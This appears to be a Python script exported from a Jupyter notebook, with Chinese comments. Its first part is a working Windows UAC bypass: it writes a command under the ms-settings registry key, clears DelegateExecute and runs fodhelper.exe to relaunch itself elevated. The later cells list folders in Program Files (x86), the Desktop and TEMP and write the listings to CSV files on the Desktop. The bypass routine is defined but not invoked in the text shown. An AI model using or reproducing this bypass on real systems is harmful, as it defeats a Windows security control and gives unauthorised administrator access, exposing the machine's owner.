#!/usr/bin/env python
# coding: utf-8

# In[2]:


# -*- coding: UTF-8 -*-
from __future__ import print_function
import winreg
import os
import csv
import sys
import ctypes


# In[3]:



if sys.version_info[0] == 3:
    import winreg as winreg
else:
    import _winreg as winreg
    
CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_admin():  
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def create_reg_key(key, value):
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
        
def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
        
def execute():        
    if not is_admin():
        pass
        #print('[!] The script is NOT running with administrative privileges')
       # print('[+] Trying to bypass the UAC')
        try:                
            current_dir = __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        #这里添加我们需要管理员权限的代码
        #print('[+] The script is running with administrative privileges!')  
        pass
        
if __name__ == '__main__':
    pass


# In[ ]:


def get_desktop():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')#利用系统的链表
    return winreg.QueryValueEx(key, "Desktop")[0] #返回的是Unicode类型数据
if __name__=='__main__':
    Desktop_path=str(get_desktop())#Unicode转化为str
    #os.path.join(Desktop_path,output.csv)
    sys_temp =str( os.getenv("TEMP"))
    #print(sys_temp)


# In[4]:


def lwalk(top, topdown=True, followlinks=False, max_level=None):
    if max_level is None:
        new_max_level = None
    else:
        if max_level==0:
            return
        else:
            new_max_level = max_level-1
    top = os.fspath(top)
    dirs, nondirs, walk_dirs = [], [], []
    with os.scandir(top) as it:
        for entry in it:
            if entry.is_dir():
                dirs.append(entry.name)
            else:
                nondirs.append(entry.name)
            if not topdown and entry.is_dir():
                if followlinks or not entry.is_symlink():
                    walk_dirs.append(entry.path)
        if topdown:
            yield top, dirs, nondirs
            for dirname in dirs:
                new_path = os.path.join(top, dirname)
                if followlinks or not os.path.islink(new_path):
                    yield from lwalk(new_path, topdown, followlinks, new_max_level)
        else:
            for new_path in walk_dirs:
                yield from lwalk(new_path, topdown, followlinks, new_max_level)
            yield top, dirs, nondirs


# In[5]:


for root, dirs, files in lwalk("C:\Program Files (x86)" ,max_level=1):
    #print(dirs)
    with open(os.path.join(Desktop_path,"data.csv"), "a") as f:
        a=[dirs]
        writer = csv.writer(f)
        writer.writerows(a)


# In[6]:


#for root, dirs, files in lwalk("C:\Program Files" ,max_level=1):
    #print(dirs)
    #with open(os.path.join(Desktop_path,"data.csv"), "a") as f:
       # d=[dirs]
       # writer = csv.writer(f)
       # writer.writerows(d)


# In[7]:


for root, dirs, files in lwalk(Desktop_path ,max_level=3):
    with open(os.path.join(Desktop_path,"data.csv"), "a") as f:
        b=[dirs]
        writer = csv.writer(f)
        writer.writerows(b)


# In[8]:


for root, dirs, files in lwalk(sys_temp ,max_level=1):
    #print(files)
    with open(os.path.join(Desktop_path,"data2.csv"), "a") as f:
        c=[files]
        writer = csv.writer(f)
        writer.writerows(c)

